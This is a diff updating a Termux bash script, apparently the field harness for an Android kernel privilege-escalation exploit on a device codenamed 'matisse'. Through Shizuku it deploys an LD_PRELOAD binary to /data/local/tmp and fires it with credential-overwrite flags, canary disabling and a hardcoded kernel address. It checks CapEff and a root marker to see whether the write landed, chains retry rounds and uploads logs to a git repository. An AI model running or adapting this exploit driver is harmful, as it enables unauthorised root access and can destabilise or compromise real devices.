@@ -1,13 +1,10 @@
 #!/data/data/com.termux/files/usr/bin/bash
 # ============================================================
-# matisse 现场全自动脚本 v2 (评审维护, 零判断执行)
+# matisse 现场全自动脚本 v3 (评审维护, 零判断执行)
 # 用法: Termux 里 `bash field_auto.sh`
-# 依赖: Shizuku 运行中 + rish 已按官方教程复制到手机
-# 令牌: $HOME/.matisse_token (一行, 用于推送回传; 不在本仓库)
-# v2 修复: Shizuku 连接闪断自动重试(读命令) / 开火命令绝不重试
-#          / 负载等待 10min->3min / termux-wake-lock 保活
-# 流程: 拉仓库 -> 部署mt60(SHA校验) -> 体检 -> R7 -> 机器门槛
-#       -> (R_LANDED=>C1 | R_MISS=>R8一次) -> 自动回传 gitee
+# v3: 取证阶段(卡死线程 wchan 定罪) / 删除验证堵陈旧门槛洞 /
+#     轮间负载闸(R8 类污染轮不再连打) / 重试提示改 stderr /
+#     C1 只在实际开火后收集 / 缺 rc 行标记 CONTAMINATED
 # ============================================================
 set -u
 TOKEN=$(cat "$HOME/.matisse_token" 2>/dev/null | tr -d ' \r\n' || true)
@@ -20,23 +17,23 @@ fi
 WORK="$HOME/matisse"
 RUN_TS=$(date +%Y%m%d_%H%M%S)
 CONSOLE_LOG="$HOME/card_console_${RUN_TS}.log"
-PUSHED=0; R7_GATE=""; R8_GATE=""; EXTRA=""
+PUSHED=0; EXTRA=""; R9_GATE=""; R10_GATE=""; C1_FIRED=0; R10_FIRED=0
 command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock 2>/dev/null
 exec > >(tee -a "$CONSOLE_LOG") 2>&1
 say(){ echo "[card] $*"; }
 SHIZUKU_DEAD_HINT="!! Shizuku 连接不稳定。手机上做一次(只需一次): 设置->应用管理->Termux和Shizuku->省电策略都改[无限制], 运行期间插充电器+亮屏, 然后重新粘贴运行本脚本"
 
-# ---------- 0. git 环境 + 拉仓库 ----------
+# ---------- 0. git + 仓库 ----------
 say "第0步: 准备 git 和仓库"
 command -v git >/dev/null 2>&1 || pkg install -y git >/dev/null 2>&1 || { say "git 安装失败,检查网络"; exit 1; }
-if [ ! -d "$WORK/.git" ]; then git clone -q "$REPO_URL" "$WORK" || { say "克隆失败,检查网络"; exit 1; }; fi
+[ -d "$WORK/.git" ] || git clone -q "$REPO_URL" "$WORK" || { say "克隆失败,检查网络"; exit 1; }
 cd "$WORK" || exit 1
 git remote set-url origin "$REPO_URL"
 git config user.name "field-termux"; git config user.email "field@termux.local"
 git pull -q origin master 2>/dev/null || true
 say "仓库就绪: $(git log --oneline -1 | cut -c1-70)"
 
-# ---------- 1. 找 rish (Shizuku) ----------
+# ---------- 1. rish ----------
 say "第1步: 查找 rish"
 RISH=""
 for c in "$HOME/rish" "$HOME/rish/rish" "$HOME/storage/downloads/rish" \
@@ -45,15 +42,10 @@ for c in "$HOME/rish" "$HOME/rish/rish" "$HOME/storage/downloads/rish" \
 done
 [ -z "$RISH" ] && RISH=$(find "$HOME" -maxdepth 3 -name rish -type f 2>/dev/null | head -1)
 if [ -z "$RISH" ]; then
-  say "!! 没找到 rish。手动做一次(只需一次):"
-  say "  1) Shizuku app -> 在终端应用中使用(rish) -> 按提示复制 rish 文件到 Download"
-  say "  2) Termux 执行: termux-setup-storage (弹窗点允许)"
-  say "  3) Termux 执行: cp /sdcard/Download/rish* ~/ ; chmod +x ~/rish*"
-  say "  4) 重新粘贴运行本脚本"
+  say "!! 没找到 rish: Shizuku app->终端应用中使用(rish)->复制到 Download; Termux 执行 termux-setup-storage; cp /sdcard/Download/rish* ~/ ; chmod +x ~/rish*; 重跑"
   exit 2
 fi
 RISH_DIR=$(dirname "$RISH"); chmod +x "$RISH" 2>/dev/null
-say "rish 路径: $RISH_DIR"
 RISH_MODE=""
 TEST_A=$( (cd "$RISH_DIR" && timeout 30 ./rish "echo RISH_OK_\$(id -u)") 2>&1 )
 printf '%s' "$TEST_A" | grep -q "RISH_OK_" && RISH_MODE=args && RISH_OUT="$TEST_A"
@@ -63,32 +55,28 @@ if [ -z "$RISH_MODE" ]; then
 fi
 [ -z "$RISH_MODE" ] && { say "!! rish 无法执行(Shizuku 没在运行?)输出: $TEST_A"; exit 2; }
 say "rish 模式: $RISH_MODE 身份: $(printf '%s' "$RISH_OUT" | tr '\n' ' ')"
-
-# rsh1: 单发不重试 (用于开火等副作用命令)
 rsh1(){ local cmd="$1" t="${2:-60}"
   if [ "$RISH_MODE" = args ]; then (cd "$RISH_DIR" && timeout "$t" ./rish "$cmd") 2>&1
   else printf '%s\n' "$cmd" | (cd "$RISH_DIR" && timeout "$t" ./rish) 2>&1; fi; }
-# rsh: 读命令/幂等命令, Shizuku 闪断自动重试 (最多4次)
 rsh(){ local cmd="$1" t="${2:-60}" out i
   for i in 1 2 3 4; do
     out=$(rsh1 "$cmd" "$t")
     printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
-    [ "$i" -lt 4 ] && say "Shizuku 连接闪断(第${i}次), 8秒后重试..."
+    [ "$i" -lt 4 ] && say "Shizuku 连接闪断(第${i}次), 8秒后重试..." >&2
     sleep 8
   done
   printf '%s\n' "$out"; return 1; }
-# rpush: 推文件到设备 (幂等, 可重试)
 rpush(){ local l="$1" r="$2" out i
   for i in 1 2 3 4; do
     if [ "$RISH_MODE" = args ]; then out=$( (cd "$RISH_DIR" && timeout 180 ./rish "cat > '$r'") < "$l" 2>&1 )
     else out=$( { echo "cat > '$r'"; cat "$l"; } | (cd "$RISH_DIR" && timeout 180 ./rish) 2>&1 ); fi
     printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
-    [ "$i" -lt 4 ] && say "Shizuku 连接闪断(第${i}次), 8秒后重试..."
+    [ "$i" -lt 4 ] && say "Shizuku 连接闪断(第${i}次), 8秒后重试..." >&2
     sleep 8
   done
   printf '%s\n' "$out"; return 1; }
 
-# ---------- 2. 部署 mt60 二进制 (SHA 机器校验) ----------
+# ---------- 2. 部署 mt60 (SHA 机器校验) ----------
 say "第2步: 部署 mt60 preload.so 并校验 SHA256"
 [ -f "$WORK/bin/mt60/preload.so" ] || { say "!! 仓库里没有 bin/mt60/preload.so"; exit 3; }
 SHA_EXP=$(grep -o '[0-9a-f]\{64\}' "$WORK/bin/mt60/BUILD_INFO.txt" 2>/dev/null | head -1)
@@ -103,88 +91,133 @@ if [ -n "$SHA_EXP" ] && [ "$SHA_GOT" != "$SHA_EXP" ]; then
 fi
 say "二进制校验通过"
 
-# ---------- 3. 体检 ----------
-say "第3步: 体检三旗"
+# ---------- 3. 取证阶段 (零开火, R7 卡死线程定罪窗口) ----------
+say "第3步: 取证 (残留进程 + 每线程 state/wchan + 负载)"
+mkdir -p "$WORK/logs_raw/R9" "$WORK/logs_raw/R10" "$WORK/logs_raw/C1"
+FORENSIC="$WORK/logs_raw/R9/forensic_${RUN_TS}.txt"
+{ rsh "date; cat /proc/sys/kernel/random/boot_id; getenforce; cat /proc/loadavg; cat /proc/uptime"
+  echo "--- residue processes ---"
+  rsh "ps -A | grep -E 'sleep|preload' || echo NO_RESIDUE"
+  echo "--- per-thread state/wchan of residue ---"
+  rsh 'for p in $(ps -A -o PID,NAME | grep -E "sleep|preload" | awk "{print \$1}"); do echo "== pid $p =="; for t in /proc/$p/task/*; do st=$(cat $t/stat 2>/dev/null | awk "{print \$3}"); wc=$(cat $t/wchan 2>/dev/null); cm=$(cat $t/comm 2>/dev/null); echo "tid=$(basename $t) comm=$cm state=$st wchan=$wc"; done; done' 60
+} > "$FORENSIC" 2>&1
+RESIDUE_FLAG=$(grep -c "state=" "$FORENSIC" 2>/dev/null || echo 0)
+say "取证落盘: $FORENSIC (线程行数=$RESIDUE_FLAG)"
+STUCK_STATES=$(grep -o "state=[DR]" "$FORENSIC" | wc -l)
+if [ "$RESIDUE_FLAG" -gt 0 ]; then
+  say "!! 发现残留进程 (线程 $RESIDUE_FLAG 条, D/R 态 $STUCK_STATES 条)"
+  say "取证已保存。请现在重启手机 (长按电源->重启), 等 10 分钟后重新粘贴运行本脚本"
+  cp "$CONSOLE_LOG" "$WORK/logs_raw/termux_console_${RUN_TS}.log" 2>/dev/null
+  git add -A >/dev/null 2>&1; git commit -q -m "v3 forensics ${RUN_TS}: residue found (threads=$RESIDUE_FLAG D/R=$STUCK_STATES) - reboot requested before fire" >/dev/null 2>&1 || true
+  for i in 1 2 3; do git pull -q --rebase origin master 2>/dev/null; git push -q origin master 2>/dev/null && break; sleep 10; done
+  exit 5
+fi
+say "无残留, 继续"
+
+# ---------- 4. 体检 (自动等到 settle) ----------
+say "第4步: 体检三旗 (新 boot 会自动等满 10 分钟)"
 BOOT0=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r')
 case "$BOOT0" in *Request\ timeout*|*"blocked"*|"") say "$SHIZUKU_DEAD_HINT"; exit 4;; esac
 ENF0=$(rsh "getenforce" 20 | tr -d '\r')
-SETTLE=$(rsh "awk '{print (\$1>600)?\"SETTLE_OK\":\"SETTLE_WAIT\"}' /proc/uptime" 20 | tr -d '\r')
-say "boot=$BOOT0 enforce=$ENF0 settle=$SETTLE"
+while :; do
+  UP=$(rsh "awk '{print int(\$1)}' /proc/uptime" 20 | tr -d '\r')
+  case "$UP" in ''|*[!0-9]*) say "uptime 读数异常"; sleep 10; continue;; esac
+  [ "$UP" -ge 600 ] && break
+  WAIT_S=$((600 - UP)); say "开机仅 ${UP}s, 再等 ${WAIT_S}s ..."; sleep $((WAIT_S > 120 ? 120 : WAIT_S))
+done
+say "boot=$BOOT0 enforce=$ENF0 settle=OK"
 LOADWAIT_N=0; GARBAGE_N=0
 while :; do
   LOAD=$(rsh "awk '{print (\$1<3)?\"LOAD_GO\":\"LOAD_WAIT\"}' /proc/loadavg" 20 | tr -d '\r')
   if [ "$LOAD" != "LOAD_GO" ] && [ "$LOAD" != "LOAD_WAIT" ]; then
-    GARBAGE_N=$((GARBAGE_N+1))
-    [ "$GARBAGE_N" -ge 2 ] && { say "$SHIZUKU_DEAD_HINT"; exit 4; }
-    say "读数异常(非负载值), 10秒后重读..."; sleep 10; continue
+    GARBAGE_N=$((GARBAGE_N+1)); [ "$GARBAGE_N" -ge 2 ] && { say "$SHIZUKU_DEAD_HINT"; exit 4; }
+    say "读数异常, 10秒后重读..."; sleep 10; continue
   fi
   say "load=$LOAD (第${LOADWAIT_N}次等待)"
   [ "$LOAD" = "LOAD_GO" ] && break
   LOADWAIT_N=$((LOADWAIT_N+1)); [ "$LOADWAIT_N" -ge 3 ] && { say "裁定: 照打(评审附录A)"; break; }
   say "负载真高, 等3分钟再试..."; sleep 180
 done
-RESIDUE=$(rsh "ps -A | grep -E 'sleep|preload' >/dev/null 2>&1 && echo RESIDUE_DIRTY || echo RESIDUE_CLEAN" 20 | tr -d '\r')
-say "residue=$RESIDUE"
-[ "$RESIDUE" = "RESIDUE_DIRTY" ] && { say "清理残留进程"; rsh "pkill -f '/system/bin/sleep'; pkill -f preload; true" 20 >/dev/null; sleep 3; }
 say "体检完成,开始开火"
 
-# ---------- 4. 开火 / 门槛 / 分支 ----------
-fire(){ local name="$1" stage="$2" task="$3" te=""
+# ---------- 5. 开火 / 门槛 / 分支 ----------
+cleangate(){ local i
+  for i in 1 2 3 4; do
+    rsh "rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt" 20 >/dev/null
+    GONE=$(rsh "ls /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt 2>/dev/null | wc -l" 20 | tr -d '\r ')
+    [ "$GONE" = "0" ] && return 0
+    say "门槛文件未删净(残留 $GONE), 重试 $i..."
+  done
+  return 1; }
+fire(){ local name="$1" stage="$2" task="$3" te="" rc_line
   [ -n "$task" ] && te=" PSELECT_TASK=$task"
-  rsh "rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt" 20 >/dev/null
+  cleangate || { say "!! $name 门槛文件删不净, 弃打本轮(防陈旧误判)"; return 1; }
   rsh1 "am kill-all" 20 >/dev/null
-  local cmd="timeout 220 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=$stage PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=auto PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_NO_CANARY=1$te LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1; echo \"$name rc=\$? enforce=\$(getenforce) boot=\$(cat /proc/sys/kernel/random/boot_id)\""
+  local cmd="timeout 220 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=$stage PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=auto PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_NO_CANARY=1$te LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1; echo \"${name}_RC=\$?\""
   say "开火 $name (约4分钟,请勿动手机,保持亮屏)..."
-  rsh1 "$cmd" 250
-}
+  rc_line=$(rsh1 "$cmd" 250 | grep -a "_RC=" | tail -1)
+  if [ -z "$rc_line" ]; then
+    say "!! $name 未返回 rc 行 (外层超时击杀) -> 标记 CONTAMINATED"
+    EXTRA="$EXTRA ${name}=CONTAMINATED"
+  else
+    say "$rc_line enforce=$(rsh 'getenforce' 20 | tr -d '\r')"
+  fi; }
 gate(){ local st; st=$(rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r')
-  if [ -z "$st" ] || ! printf '%s' "$st" | grep -q "task="; then echo "MISS_NOSTATUS"; return; fi
+  if [ -z "$st" ] || ! printf '%s' "$st" | grep -q "task="; then echo "R_MISS"; return; fi
   if printf '%s' "$st" | grep -q "CapEff=0000000000000000"; then echo "R_MISS"; else echo "R_LANDED"; fi; }
 gettask(){ rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r' | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1; }
 bootid(){ rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r'; }
+loadgo(){ rsh "awk '{print (\$1<3)?\"LOAD_GO\":\"LOAD_WAIT\"}' /proc/loadavg" 20 | tr -d '\r'; }
 
-fire R7 R ""
-R7_GATE=$(gate); say "R7 门槛判定: $R7_GATE"
+fire R9 R ""
+R9_GATE=$(gate); say "R9 门槛判定: $R9_GATE"
 BOOT1=$(bootid)
-if [ "$R7_GATE" = "R_LANDED" ] && [ "$BOOT1" = "$BOOT0" ]; then
-  T=$(gettask); say "R 写落地! 立即补 C 轮 TASK=$T"; fire C1 C "$T"
-elif { [ "$R7_GATE" = "R_MISS" ] || [ "$R7_GATE" = "MISS_NOSTATUS" ]; } && [ "$BOOT1" = "$BOOT0" ]; then
-  say "R_MISS,按卡重掷 R8 (最后一轮)"; fire R8 R ""
-  R8_GATE=$(gate); say "R8 门槛判定: $R8_GATE"
-  BOOT2=$(bootid)
-  if [ "$R8_GATE" = "R_LANDED" ] && [ "$BOOT2" = "$BOOT0" ]; then
-    T=$(gettask); say "R8 落地! 立即补 C 轮 TASK=$T"; fire C1 C "$T"
-  else
-    say "两轮未中,按卡停止(不跑第三轮)"; EXTRA="两轮R_MISS已停"
-  fi
+if [ "$R9_GATE" = "R_LANDED" ] && [ "$BOOT1" = "$BOOT0" ]; then
+  T=$(gettask); say "R 写落地! 立即补 C 轮 TASK=$T"; C1_FIRED=1; fire C1 C "$T"
+elif [ "$BOOT1" != "$BOOT0" ]; then
+  say "boot 变化, 停止后续轮"; EXTRA="$EXTRA boot_changed"
 else
-  say "状态异常/boot 变化,停止后续轮"
-  [ "$BOOT1" != "$BOOT0" ] && EXTRA="警告:boot_id已变化(设备重启)"
+  LOAD2=$(loadgo); say "轮间负载闸: $LOAD2"
+  if [ "$LOAD2" = "LOAD_GO" ]; then
+    say "R_MISS 且负载绿, 重掷 R10 (最后一轮)"; R10_FIRED=1; fire R10 R ""
+    R10_GATE=$(gate); say "R10 门槛判定: $R10_GATE"
+    BOOT2=$(bootid)
+    if [ "$R10_GATE" = "R_LANDED" ] && [ "$BOOT2" = "$BOOT0" ]; then
+      T=$(gettask); say "R10 落地! 立即补 C 轮 TASK=$T"; C1_FIRED=1; fire C1 C "$T"
+    else
+      say "两轮未中,按卡停止"; EXTRA="$EXTRA two_miss_stopped"
+    fi
+  else
+    say "轮间负载高 (疑似卡死线程占核) -> 不打第二轮, 保设备干净"; EXTRA="$EXTRA inter_round_load_stop"
+  fi
 fi
 
-# ---------- 5. 回收 + 回传 ----------
-say "第5步: 回收数据并回传"
-mkdir -p "$WORK/logs_raw/R7" "$WORK/logs_raw/R8" "$WORK/logs_raw/C1"
-for n in R7 R8 C1; do
-  rsh "cat /data/local/tmp/$n.out" 60 > "$WORK/logs_raw/$n/${n}_termux_raw.out" 2>/dev/null
-  [ -s "$WORK/logs_raw/$n/${n}_termux_raw.out" ] || rm -f "$WORK/logs_raw/$n/${n}_termux_raw.out"
+# ---------- 6. 回收 + 回传 ----------
+say "第6步: 回收数据并回传"
+for n in R9 R10; do
+  rsh "cat /data/local/tmp/$n.out" 60 > "$WORK/logs_raw/$n/${n}_raw.out" 2>/dev/null
+  [ -s "$WORK/logs_raw/$n/${n}_raw.out" ] || rm -f "$WORK/logs_raw/$n/${n}_raw.out"
 done
-rsh "cat /data/local/tmp/mt49_child_status.txt" 30 > "$WORK/logs_raw/R7/mt49_status_final.txt" 2>/dev/null
-{ rsh "cat /data/local/tmp/root_alive.txt" 20 2>/dev/null; [ ! -s "$WORK/logs_raw/C1/root_alive.txt" ] && echo "NO_ROOT_MARKER"; } > "$WORK/logs_raw/C1/root_alive.txt" 2>/dev/null
-rsh "dumpsys dropbox --print data_app_anr 2>/dev/null | tail -c 300000" 60 > "$WORK/logs_raw/termux_anr_dropbox.txt" 2>/dev/null
-ALIVE=$(rsh "getenforce; cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r' | tr '\n' ' ')
+if [ "$C1_FIRED" = 1 ]; then
+  rsh "cat /data/local/tmp/C1.out" 60 > "$WORK/logs_raw/C1/C1_raw.out" 2>/dev/null
+  [ -s "$WORK/logs_raw/C1/C1_raw.out" ] || rm -f "$WORK/logs_raw/C1/C1_raw.out"
+  { rsh "cat /data/local/tmp/root_alive.txt" 20 2>/dev/null; } > "$WORK/logs_raw/C1/root_alive.txt" 2>/dev/null
+fi
+rsh "cat /data/local/tmp/mt49_child_status.txt" 30 > "$WORK/logs_raw/R9/mt49_status_final.txt" 2>/dev/null
+rsh "dumpsys dropbox --print data_app_anr 2>/dev/null | tail -c 200000" 60 > "$WORK/logs_raw/anr_dropbox_${RUN_TS}.txt" 2>/dev/null
+ALIVE=$(rsh "getenforce; cat /proc/sys/kernel/random/boot_id; cat /proc/loadavg" 20 | tr -d '\r' | tr '\n' ' ')
 say "结束活体: $ALIVE"
-CANARY_CHK=$(grep -a "canary planted\|pselect returned" "$WORK/logs_raw/R7/"*_raw.out 2>/dev/null | head -4)
-{ echo "# 卡4 Termux 自动运行 v2 $RUN_TS"
-  echo "- rish模式: $RISH_MODE 身份: $RISH_OUT"
-  echo "- 开火前: boot=$BOOT0 enforce=$ENF0 settle=$SETTLE residue=$RESIDUE"
-  echo "- R7门槛: $R7_GATE / R8门槛: ${R8_GATE:-未跑} / $EXTRA"
-  echo "- canary理论验证行:"; echo "$CANARY_CHK"
+SIG_GREP=$(grep -a "pselect returned\|mt19b\|sched_ok\|canary planted\|mt25: futex trigger 0" "$WORK/logs_raw/R9/R9_raw.out" 2>/dev/null | head -8)
+{ echo "# 卡5 Termux 自动运行 v3 $RUN_TS"
+  echo "- 取证: 线程行=$RESIDUE_FLAG (D/R=$STUCK_STATES)"
+  echo "- 开火前: boot=$BOOT0 enforce=$ENF0"
+  echo "- R9门槛: $R9_GATE / R10门槛: ${R10_GATE:-未跑} / C1开打: $C1_FIRED / $EXTRA"
+  echo "- consumer 签名行 (last_sched_ret 判别器):"; echo "$SIG_GREP"
   echo "- 结束活体: $ALIVE"
-} > "$WORK/logs_raw/CARD4_TERMUX_${RUN_TS}.md"
+} > "$WORK/logs_raw/CARD5_TERMUX_${RUN_TS}.md"
 cp "$CONSOLE_LOG" "$WORK/logs_raw/termux_console_${RUN_TS}.log" 2>/dev/null
-git add -A
-git commit -q -m "termux auto card4-v2 ${RUN_TS}: R7=${R7_GATE} R8=${R8_GATE:-skip} canary-off armed-write (auto field script)" || true
+git add -A >/dev/null 2>&1
+git commit -q -m "termux auto card5-v3 ${RUN_TS}: R9=${R9_GATE} R10=${R10_GATE:-skip} C1=$C1_FIRED$EXTRA (forensics+single/dual gated rounds)" || true
 for i in 1 2 3; do
   git pull -q --rebase origin master 2>/dev/null
   git push -q origin master 2>/dev/null && { PUSHED=1; break; }
